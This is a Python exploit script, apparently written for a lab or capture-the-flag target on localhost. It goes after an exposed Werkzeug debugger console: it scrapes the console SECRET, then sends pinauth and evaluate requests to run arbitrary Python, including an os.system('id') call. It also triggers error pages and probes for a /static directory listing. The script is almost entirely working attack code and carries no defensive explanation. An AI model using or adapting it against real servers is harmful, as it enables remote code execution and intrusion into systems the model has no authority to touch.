import requests
import re

BASE_URL = "http://127.0.0.1:32997"
SESSION_COOKIE = "eyJfZnJlc2giOmZhbHNlfQ.ac3llg.UJzGdw1D2kKSnyOhHRIJojg-VvQ"

session = requests.Session()
session.cookies.set('session', SESSION_COOKIE)

# CRITICAL: Werkzeug debugger console discovered
# Let's get more details about this console endpoint
print("=" * 80)
print("WERKZEUG DEBUGGER CONSOLE ANALYSIS")
print("=" * 80)

# Get the full console page
resp = session.get(f"{BASE_URL}/console", timeout=10)
print(f"Status: {resp.status_code}")
print(f"Headers: {dict(resp.headers)}")
print(f"\nFull Response:\n{resp.text}")

print("\n" + "=" * 80)
print("EXTRACTED SECRET FROM CONSOLE")
print("=" * 80)

# Extract the SECRET from the console page
secret_match = re.search(r'SECRET\s*=\s*"([^"]+)"', resp.text)
if secret_match:
    SECRET = secret_match.group(1)
    print(f"SECRET: {SECRET}")
    
    # The Werkzeug debugger console typically allows command execution
    # if you have the SECRET. Let's try to access it
    
    print("\n" + "=" * 80)
    print("ATTEMPTING DEBUGGER COMMAND EXECUTION")
    print("=" * 80)
    
    # Try to execute a simple command via the debugger API
    # The debugger typically uses ?__debugger__=yes&cmd=... 
    
    # Test with 'help' or 'print' command
    test_cmds = [
        'print(1+1)',
        "print('test')",
        '__import__("os").system("id")',
        "import os; print(os.getcwd())"
    ]
    
    for cmd in test_cmds:
        print(f"\nTrying command: {cmd}")
        
        # Try the console pin-based authentication
        # First check if there's a PIN system
        pin_url = f"{BASE_URL}/console?__debugger__=yes&cmd=pinauth&pin=undefined&s={SECRET}"
        resp = session.get(pin_url, timeout=10)
        print(f"  PIN auth response status: {resp.status_code}")
        print(f"  Response: {resp.text[:500]}")
        
        # Try direct command execution via evaluate
        eval_url = f"{BASE_URL}/console?__debugger__=yes&cmd=evaluate&frm=0&code={requests.utils.quote(cmd)}&s={SECRET}"
        resp = session.get(eval_url, timeout=10)
        print(f"  Eval response status: {resp.status_code}")
        print(f"  Response: {resp.text[:1000]}")

print("\n" + "=" * 80)
print("CHECKING FOR DEBUGGER OTHER ENDPOINTS")
print("=" * 80)

# Try to trigger an actual error to see if we get a debugger traceback
print("\nTriggering error to check for debugger page...")
error_resp = session.get(f"{BASE_URL}/trigger-error", timeout=5)
print(f"Status: {error_resp.status_code}")
if error_resp.status_code == 500:
    print(f"Response: {error_resp.text[:2000]}")

# Try to check if /static contains source files or debug info
print("\nChecking /static/ directory...")
static_resp = session.get(f"{BASE_URL}/static/", timeout=10)
print(f"Status: {static_resp.status_code}")
if static_resp.status_code == 200:
    print(f"Directory listing found: {static_resp.text[:1000]}")

